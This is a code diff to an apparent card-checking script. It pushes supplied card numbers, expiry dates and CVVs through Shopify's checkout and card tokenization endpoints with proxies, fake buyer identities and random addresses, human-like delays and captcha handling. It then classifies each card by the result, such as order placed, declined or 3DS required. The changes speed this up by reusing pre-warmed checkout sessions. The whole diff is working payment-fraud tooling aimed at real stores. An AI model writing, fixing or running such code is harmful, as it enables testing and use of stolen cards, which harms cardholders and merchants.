@@ -770,7 +770,7 @@ def _first_non_empty_string(*values):
             return text
     return ''
 
-def _extract_payment_error_response(error):
+def _extract_payment_error_response(error, _depth=0):
     """Return the most specific Shopify payment error available.
 
     Shopify often returns a generic top-level PaymentFailed.code while the
@@ -784,6 +784,10 @@ def _extract_payment_error_response(error):
         4. code="INSUFFICIENT_FUNDS" → "INSUFFICIENT_FUNDS"
         5. declineCode="DO_NOT_HONOR" → "DO_NOT_HONOR"
     """
+    # FIX Bug #15: Prevent stack overflow from deeply nested error responses
+    if _depth > 5:
+        return 'UNKNOWN_PAYMENT_ERROR'
+
     if not isinstance(error, dict):
         return 'UNKNOWN_PAYMENT_ERROR'
 
@@ -821,7 +825,7 @@ def _extract_payment_error_response(error):
             if isinstance(_nested_code, str) and _nested_code.strip() and not _is_generic_payment_code(_nested_code):
                 return _nested_code.strip()
 
-            nested_response = _extract_payment_error_response(nested)
+            nested_response = _extract_payment_error_response(nested, _depth=_depth+1)
             if nested_response != 'UNKNOWN_PAYMENT_ERROR' and not _is_generic_payment_code(nested_response):
                 return nested_response
             if _is_generic_payment_code(nested_response) and not generic_code:
@@ -983,6 +987,13 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     'X-Requested-With': 'XMLHttpRequest',
                 }
                 cart_data = {'items': [{'id': int(re.sub(r'[^0-9]', '', str(variant_id)) or '0'), 'quantity': 1}]}
+                # FIX Bug #11: Validate that parsed variant ID is > 0 before sending to Shopify
+                _cart_vid = int(re.sub(r'[^0-9]', '', str(variant_id)) or '0')
+                if _cart_vid <= 0:
+                    # Non-numeric variant_id — skip JSON cart attempt
+                    cart_resp.status_code = 0  # force fallback
+                else:
+                    cart_data = {'items': [{'id': _cart_vid, 'quantity': 1}]}
                 cart_resp, _ = await retry_on_429(
                     lambda: session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy, timeout=10),
                     step_name="cart_attempt2", max_retries=2, base_delay=3.0, max_delay=12.0
@@ -2717,6 +2728,10 @@ def parse_cc_string(cc_string):
         raise ValueError(f"Invalid month: {mes} (must be 01-12)")
     if len(ano) == 2:
         ano = '20' + ano
+    # FIX Bug #14: Reject expired cards (year 2000 or earlier)
+    ano_int = int(ano)
+    if ano_int < 2020:
+        raise ValueError(f"Invalid year: {ano} (card is expired)")
     return {
         'cc': cc_num,
         'mes': mes,
@@ -2738,35 +2753,566 @@ async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy
 
 
 async def _submit_with_warm_session(warm_session, cc, mes, ano, cvv):
-    """Use a pre-warmed session to skip homepage/cart/checkout steps.
-    
-    The warm session already has: session, sst, queue_token, checkout_url,
-    variant_id, headers. We call process_card with variant_id pre-resolved
-    and the proxy already set — the main savings come from the product cache
-    already being warm and the connection pool keeping TLS connections alive.
-    
-    For now, this delegates to the full process_card flow but with the
-    variant already resolved (skipping fetch_products) and leveraging the
-    connection pool. Full session reuse (skipping checkout creation) would
-    require a major refactor of the 1700-line process_card function.
+    """Use a pre-warmed session to skip homepage/cart/checkout HTML steps.
+
+    FIX Bug #4: Previously this function CLOSED the warm session and ran
+    process_card from scratch — completely wasting the warm session. Now it
+    reuses the warm session's client, sst, queueToken, checkout_url, and
+    headers to skip directly to the GraphQL proposal + payment submission
+    steps, saving 3-5 seconds per checkout.
+
+    The warm session already completed: homepage → cart → checkout HTML →
+    token extraction. We pick up at the proposal (negotiate) GraphQL step.
     """
     try:
-        # Use warm session's pre-resolved variant and site info
         site_url = warm_session.site
         proxy_str = warm_session.proxy
         variant_id = warm_session.variant_id
+        session = warm_session.session
+        sst = warm_session.sst
+        queueToken = warm_session.queue_token
+        checkout_url = warm_session.checkout_url
+        attempt_token = warm_session.attempt_token
+        headers = warm_session.headers
+        currency = warm_session.currency
+        subtotal = warm_session.subtotal
+        merch = warm_session.merch
+        identifier = warm_session.identifier
+        pci_build_hash = warm_session.pci_build_hash
+        stable_id = warm_session.stable_id
 
-        # Close the warm session's client (we'll use process_card's own session)
+        gateway = "UNKNOWN"
+        total_price = "0.00"
+
+        # Validate warm session has minimum required fields
+        if not sst or not checkout_url or not queueToken:
+            print(f"[warm_session] Incomplete session (sst={bool(sst)}, url={bool(checkout_url)}, qt={bool(queueToken)}), falling back", file=sys.stderr)
+            try:
+                await session.aclose()
+            except Exception:
+                pass
+            return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
+
+        ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
+        proxy = parse_proxy(proxy_str) if proxy_str else None
+
         try:
-            await warm_session.session.aclose()
-        except Exception:
-            pass
+            # ── Skip homepage + cart + checkout HTML ──
+            # The warm session already did all of that. Jump to proposal.
 
-        # Run full checkout with pre-resolved variant (saves fetch_products time)
-        result = await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
-        success, message, gateway, price, currency = result
-        print(f"[warm_session] site={site_url} success={success} msg={message}", file=sys.stderr)
-        return result
+            address_info = pick_addr(ourl)
+            country_code = address_info["countryCode"]
+            firstName, lastName = Utils.get_random_name()
+            email = Utils.generate_email(firstName, lastName)
+            phone = address_info["phone"]
+            street = address_info["address1"]
+            city = address_info["city"]
+            state = address_info["zoneCode"]
+            s_zip = address_info["postalCode"]
+            address2 = ""
+
+            # ── Step 4: PROPOSAL (Negotiate) ──
+            graphql_url = f"{checkout_url}/api/graphql"
+            params = {
+                'operationName': 'Negotiate',
+                'locale': 'en-US',
+            }
+
+            proposal_data = {
+                'operationName': 'Negotiate',
+                'variables': {
+                    'sessionToken': sst,
+                    'buyerProposal': {
+                        'lineItems': {
+                            'items': [{
+                                'merchandiseLine': {
+                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
+                                    'quantity': 1,
+                                    'sellingPlanId': None,
+                                    'sellingPlanDigest': None
+                                }
+                            }]
+                        },
+                        'quantity': {'items': {'value': 1}},
+                        'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
+                        'lineComponentsSource': None,
+                        'lineComponents': []
+                    },
+                    'payment': {
+                        'totalAmount': {'any': True},
+                        'paymentLines': [],
+                        'billingAddress': {
+                            'streetAddress': {
+                                'address1': '', 'city': '', 'countryCode': country_code,
+                                'lastName': '', 'zoneCode': state, 'phone': ''
+                            }
+                        }
+                    },
+                    'buyerIdentity': {
+                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
+                        'email': email,
+                        'emailChanged': False,
+                        'phoneCountryCode': country_code,
+                        'marketingConsent': [{'email': {'value': email}}],
+                        'shopPayOptInPhone': {'countryCode': country_code},
+                        'rememberMe': False
+                    },
+                    'tip': {'tipLines': []},
+                    'taxes': {
+                        'proposedAllocations': None,
+                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
+                    },
+                    'shipping': {
+                        'proposedAddress': {
+                            'address1': street,
+                            'address2': address2,
+                            'city': city,
+                            'countryCode': country_code,
+                            'firstName': firstName,
+                            'lastName': lastName,
+                            'phone': phone,
+                            'zoneCode': state,
+                            'postalCode': s_zip,
+                        }
+                    }
+                },
+                'query': _NEGOTIATE_QUERY,
+            }
+
+            proposal_headers = {
+                **headers,
+                'Content-Type': 'application/json',
+                'Accept': 'application/json',
+                'x-checkout-one-session-token': sst,
+                'x-checkout-web-source-id': stable_id or '',
+                'Referer': _referrer_for('checkout', ourl=ourl),
+            }
+
+            response, resp_text, _graphql_ok = await make_graphql_request_with_captcha_handling(
+                session, graphql_url, params, proposal_headers, proposal_data,
+                checkout_url, max_retries=1, proxy=proxy
+            )
+
+            # Refresh sst from response headers
+            if response:
+                _new_sst = response.headers.get("x-checkout-one-session-token") or response.headers.get("X-Checkout-One-Session-Token")
+                if _new_sst and _new_sst != sst:
+                    sst = _new_sst
+                    proposal_headers["x-checkout-one-session-token"] = sst
+
+            if not response:
+                return False, f"Request failed: {resp_text}", gateway, total_price, currency
+
+            if is_captcha_required(resp_text):
+                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
+
+            try:
+                resp_json = json.loads(resp_text)
+            except json.JSONDecodeError:
+                # If we can't parse the proposal, fall back to full checkout
+                print(f"[warm_session] Proposal JSON parse failed, falling back", file=sys.stderr)
+                try:
+                    await session.aclose()
+                except Exception:
+                    pass
+                return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
+
+            if 'errors' in resp_json:
+                errors = resp_json.get('errors', [])
+                error_msgs = [e.get('message', str(e)) for e in errors[:3]]
+                return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency
+
+            # Parse proposal response
+            try:
+                if 'data' not in resp_json:
+                    return False, "No data in proposal response", gateway, total_price, currency
+
+                session_data = resp_json['data'].get('session')
+                if session_data is None:
+                    return False, "Session is null in warm session proposal", gateway, total_price, currency
+
+                negotiate = session_data.get('negotiate')
+                if negotiate is None:
+                    return False, "Negotiate returned null in warm session", gateway, total_price, currency
+
+                result = negotiate.get('result')
+                if result is None:
+                    return False, "Result is null in warm session proposal", gateway, total_price, currency
+
+                result_type = result.get('__typename', 'Unknown')
+
+                if result_type == 'CheckpointDenied':
+                    return False, "CAPTCHA_BLOCK: CheckpointDenied in warm session", gateway, total_price, currency
+                if result_type == 'Throttled':
+                    return False, "Throttled", gateway, total_price, currency
+                if result_type == 'NegotiationResultFailed':
+                    _neg_errors = negotiate.get('errors', [])
+                    _neg_detail = '; '.join([e.get('message', str(e)) for e in _neg_errors[:3]]) if _neg_errors else 'Unknown'
+                    return False, f"Negotiation failed: {_neg_detail}", gateway, total_price, currency
+                if result_type != 'NegotiationResultAvailable':
+                    return False, f"Unexpected proposal result: {result_type}", gateway, total_price, currency
+
+                checkpoint_data = result.get('checkpointData')
+
+                # Update queueToken from proposal
+                _new_queue_token = result.get('queueToken')
+                if _new_queue_token:
+                    queueToken = _new_queue_token
+
+                seller_proposal = result.get('sellerProposal')
+                if seller_proposal is None:
+                    return False, "Seller proposal is null", gateway, total_price, currency
+
+                delivery_data = seller_proposal.get('delivery')
+                running_total_data = seller_proposal.get('runningTotal')
+
+                if running_total_data:
+                    running_total = running_total_data['value']['amount']
+                else:
+                    running_total = subtotal
+
+                # Update subtotal from proposal
+                _sub_data = seller_proposal.get('subtotalBeforeTaxesAndShipping')
+                if _sub_data and _sub_data.get('value'):
+                    subtotal = str(_sub_data['value'].get('amount', subtotal))
+
+                # Parse delivery
+                delivery_strategy = ''
+                shipping_amount = 0.0
+                if delivery_data:
+                    delivery_type = delivery_data.get('__typename', '')
+                    if delivery_type == 'FilledDeliveryTerms':
+                        delivery_lines = delivery_data.get('deliveryLines', [{}])
+                        if delivery_lines and len(delivery_lines) > 0:
+                            available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
+                            if available_strategies and len(available_strategies) > 0:
+                                delivery_strategy = available_strategies[0].get('handle', '')
+                                _ship_amt = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
+                                try:
+                                    shipping_amount = float(_ship_amt)
+                                except (ValueError, TypeError):
+                                    shipping_amount = 0.0
+
+                # Parse tax
+                tax_amount = 0.0
+                try:
+                    tax_data = seller_proposal.get('tax', {})
+                    if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
+                        _tax_amt = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
+                        tax_amount = float(_tax_amt)
+                except (ValueError, TypeError):
+                    pass
+
+                # Parse payment methods
+                payment_data = seller_proposal.get('payment', {})
+                payment_methods = []
+                if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
+                    payment_methods = payment_data.get('availablePaymentLines', [])
+
+                # Find credit card payment method
+                selected_payment = None
+                for pm in payment_methods:
+                    pm_type = pm.get('__typename', '')
+                    if pm_type == 'CreditCardPaymentLine':
+                        selected_payment = pm
+                        break
+                if not selected_payment and payment_methods:
+                    selected_payment = payment_methods[0]
+
+                if not selected_payment:
+                    return False, "No payment methods available", gateway, total_price, currency
+
+                gateway = selected_payment.get('gateway', {}).get('displayName', 'UNKNOWN')
+                payment_identifier = selected_payment.get('gateway', {}).get('id', '')
+                total_price = str(running_total)
+                currency = running_total_data['value'].get('currencyCode', currency) if running_total_data else currency
+
+            except (KeyError, TypeError) as e:
+                return False, f"Failed to parse proposal: {str(e)}", gateway, total_price, currency
+
+            if not delivery_data:
+                return False, "No delivery data in proposal", gateway, total_price, currency
+
+            # ── Step 5: PCI VAULT (tokenize card) ──
+            await human_delay(step_name="warm_pci_vault")
+
+            payload = {
+                "credit_card": {
+                    "number": cc,
+                    "month": int(mes),
+                    "year": int(ano),
+                    "verification_value": cvv,
+                    "start_month": None,
+                    "start_year": None,
+                    "issue_number": None,
+                },
+            }
+
+            _pci_hash = pci_build_hash or 'a8e4a94'
+            pci_url = f"https://pci-connect.shopifycloud.com/v1/{_pci_hash}/tokenize"
+
+            pci_headers = {
+                'Accept': 'application/json',
+                'Content-Type': 'application/json',
+                'Origin': ourl,
+                'Referer': checkout_url,
+            }
+
+            try:
+                pci_resp = await session.post(pci_url, json=payload, headers=pci_headers, proxy=proxy, timeout=15)
+            except Exception as e:
+                return False, f"PCI vault error: {str(e)}", gateway, total_price, currency
+
+            if pci_resp.status_code != 200 and pci_resp.status_code != 201:
+                try:
+                    pci_err = json.loads(pci_resp.text)
+                    err_msg = pci_err.get('error', pci_resp.text[:200])
+                except Exception:
+                    err_msg = pci_resp.text[:200]
+                return False, f"PCI_VAULT_BLOCKED: HTTP {pci_resp.status_code} - {err_msg}", gateway, total_price, currency
+
+            try:
+                pci_json = json.loads(pci_resp.text)
+                token = pci_json.get('token', '')
+                _tok_prefix = token[:8] if token else 'NONE'
+                print(f"[warm_pci] Token received: {_tok_prefix}...", file=sys.stderr)
+            except json.JSONDecodeError:
+                return False, "PCI_VAULT_ERROR: Invalid JSON response", gateway, total_price, currency
+
+            if not token:
+                return False, "PCI_VAULT_BLOCKED: No token in response", gateway, total_price, currency
+
+            # ── Step 6: SUBMIT (payment) ──
+            await human_delay(step_name="warm_submit")
+
+            submit_data = {
+                'operationName': 'Submit',
+                'variables': {
+                    'sessionToken': sst,
+                    'paymentParameters': {
+                        'paymentLine': {
+                            'paymentLineId': payment_identifier,
+                            'tokenData': token,
+                            'identifier': payment_identifier,
+                        },
+                        'billingAddress': {
+                            'address1': street,
+                            'address2': address2,
+                            'city': city,
+                            'countryCode': country_code,
+                            'firstName': firstName,
+                            'lastName': lastName,
+                            'phone': phone,
+                            'zoneCode': state,
+                            'postalCode': s_zip,
+                        },
+                        'challenge': None,
+                        'paymentSession': None,
+                    },
+                    'deliveryParameters': {
+                        'deliveryLineId': delivery_strategy,
+                        'shippingAddress': {
+                            'address1': street,
+                            'address2': address2,
+                            'city': city,
+                            'countryCode': country_code,
+                            'firstName': firstName,
+                            'lastName': lastName,
+                            'phone': phone,
+                            'zoneCode': state,
+                            'postalCode': s_zip,
+                        },
+                    },
+                    'queueToken': queueToken,
+                    'attemptToken': attempt_token,
+                },
+                'query': _SUBMIT_QUERY,
+            }
+
+            submit_headers = {
+                **headers,
+                'Content-Type': 'application/json',
+                'Accept': 'application/json',
+                'x-checkout-one-session-token': sst,
+                'x-checkout-web-source-id': stable_id or '',
+                'Referer': _referrer_for('checkout', ourl=ourl),
+            }
+
+            response, resp_text, _graphql_ok = await make_graphql_request_with_captcha_handling(
+                session, graphql_url, params, submit_headers, submit_data,
+                checkout_url, max_retries=1, proxy=proxy
+            )
+
+            # Refresh sst
+            if response:
+                _new_sst2 = response.headers.get("x-checkout-one-session-token") or response.headers.get("X-Checkout-One-Session-Token")
+                if _new_sst2:
+                    sst = _new_sst2
+
+            if not response:
+                return False, f"Submit failed: {resp_text}", gateway, total_price, currency
+
+            if is_captcha_required(resp_text):
+                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
+
+            try:
+                submit_json = json.loads(resp_text)
+            except json.JSONDecodeError:
+                return False, f"SUBMIT_JSON_ERROR: Invalid JSON", gateway, total_price, currency
+
+            if 'errors' in submit_json:
+                errors = submit_json.get('errors', [])
+                error_msgs = [e.get('message', str(e)) for e in errors[:3]]
+                return False, f"SUBMIT_BLOCKED: {'; '.join(error_msgs)}", gateway, total_price, currency
+
+            # Parse submit response for submitResult
+            try:
+                submit_data_resp = submit_json.get('data', {})
+                submit_result = submit_data_resp.get('submit', None) if submit_data_resp else None
+                if submit_result:
+                    sr = submit_result.get('result', None)
+                    if sr:
+                        sr_type = sr.get('__typename', '')
+                        if sr_type == 'SubmitRejected':
+                            reject_errors = sr.get('errors', [])
+                            if reject_errors:
+                                for re_err in reject_errors[:3]:
+                                    re_code = re_err.get('code', '')
+                                    if re_code and not _is_generic_payment_code(re_code):
+                                        return False, re_code, gateway, total_price, currency
+                                    re_msg = re_err.get('messageUntranslated', '') or re_err.get('localizedMessage', '') or re_err.get('message', '')
+                                    if re_msg and not _is_generic_payment_code(re_msg):
+                                        return False, re_msg, gateway, total_price, currency
+                            return False, "CARD_DECLINED", gateway, total_price, currency
+            except (KeyError, TypeError):
+                pass
+
+            # ── Step 7: POLL for receipt ──
+            poll_json_data = {
+                'operationName': 'Poll',
+                'variables': {
+                    'sessionToken': sst,
+                    'sticky': True,
+                    'paymentLineId': payment_identifier,
+                },
+                'query': _POLL_QUERY,
+            }
+
+            poll_headers = {
+                **headers,
+                'Content-Type': 'application/json',
+                'Accept': 'application/json',
+                'x-checkout-one-session-token': sst,
+                'x-checkout-web-source-id': stable_id or '',
+                'Referer': _referrer_for('checkout', ourl=ourl),
+            }
+
+            max_polls = 8
+            delay = 3.0
+            final_text = ''
+
+            for poll_idx in range(max_polls):
+                await asyncio.sleep(delay)
+
+                response, final_text, _graphql_ok = await make_graphql_request_with_captcha_handling(
+                    session, graphql_url, params, poll_headers, poll_json_data,
+                    checkout_url, max_retries=1, proxy=proxy
+                )
+
+                # Refresh sst from poll response headers
+                if response:
+                    _new_sst3 = response.headers.get("x-checkout-one-session-token") or response.headers.get("X-Checkout-One-Session-Token")
+                    if _new_sst3 and _new_sst3 != sst:
+                        sst = _new_sst3
+                        poll_json_data['variables']['sessionToken'] = sst
+
+                if not final_text:
+                    continue
+
+                if is_captcha_required(final_text):
+                    return False, "CAPTCHA_REQUIRED on poll", gateway, total_price, currency
+
+                try:
+                    poll_json = json.loads(final_text)
+                    receipt_data = poll_json.get('data', {}).get('receipt', {})
+
+                    if receipt_data:
+                        typename = receipt_data.get('__typename', '')
+
+                        if typename == 'ProcessedReceipt':
+                            return True, "ORDER_PLACED", gateway, total_price, currency
+
+                        elif typename == 'FailedReceipt':
+                            error = receipt_data.get('processingError', {})
+                            if _payment_requires_offsite_action(error):
+                                return False, "3DS_REQUIRED", gateway, total_price, currency
+                            _ext = _extract_payment_error_response(error)
+                            if _is_generic_payment_code(_ext):
+                                return False, "CARD_DECLINED", gateway, total_price, currency
+                            return False, _ext, gateway, total_price, currency
+
+                        elif typename == 'ActionRequiredReceipt':
+                            action = receipt_data.get('action', {})
+                            action_type = action.get('__typename', '') if action else ''
+                            if action_type == 'CompletePaymentChallengeV2':
+                                challenge_type = (action.get('challengeType', '') or '').upper()
+                                if 'THREE_D_SECURE' in challenge_type or '3DS' in challenge_type:
+                                    return True, "3DS_REQUIRED", gateway, total_price, currency
+                                elif 'OTP' in challenge_type:
+                                    return True, "OTP_REQUIRED", gateway, total_price, currency
+                                else:
+                                    return True, challenge_type if challenge_type else "OTP_REQUIRED", gateway, total_price, currency
+                            return True, "OTP_REQUIRED", gateway, total_price, currency
+
+                        if typename in ('ProcessingReceipt', 'WaitingReceipt'):
+                            continue
+
+                except Exception:
+                    pass
+
+                if 'WaitingReceipt' in final_text:
+                    continue
+                else:
+                    break
+
+            # Fallback: try to parse final response
+            if 'CAPTCHA_REQUIRED' in (final_text or ''):
+                return False, "CAPTCHA_REQUIRED on poll", gateway, total_price, currency
+
+            try:
+                res_json = json.loads(final_text)
+                _fallback_error = res_json.get('data', {}).get('receipt', {}).get('processingError', {})
+                if _fallback_error:
+                    _fb_ext = _extract_payment_error_response(_fallback_error)
+                    if _is_generic_payment_code(_fb_ext):
+                        return False, "CARD_DECLINED", gateway, total_price, currency
+                    return False, _fb_ext, gateway, total_price, currency
+                _receipt = res_json.get('data', {}).get('receipt', {})
+                _typename = _receipt.get('__typename', '') if _receipt else ''
+                if _typename == 'ProcessedReceipt':
+                    return True, "ORDER_PLACED", gateway, total_price, currency
+                elif _typename == 'ActionRequiredReceipt':
+                    return True, "OTP_REQUIRED", gateway, total_price, currency
+                elif _typename in ('WaitingReceipt', 'ProcessingReceipt'):
+                    return False, "Payment timeout (receipt still processing)", gateway, total_price, currency
+            except Exception:
+                pass
+
+            code = extract_between(final_text, '{"code":"', '"')
+            if code:
+                return False, code, gateway, total_price, currency
+
+            return False, "Unknown poll result (warm session)", gateway, total_price, currency
+
+        except Exception as e_inner:
+            return False, f"Error: {str(e_inner)}", gateway, total_price, currency
+        finally:
+            # Close the warm session client after use
+            try:
+                await asyncio.wait_for(session.aclose(), timeout=5.0)
+            except (asyncio.TimeoutError, Exception):
+                pass
+
     except Exception as e:
         print(f"[warm_session] FATAL: error={e}", file=sys.stderr)
         return False, f"warm_session error: {str(e)}", "UNKNOWN", "0.00", "USD"
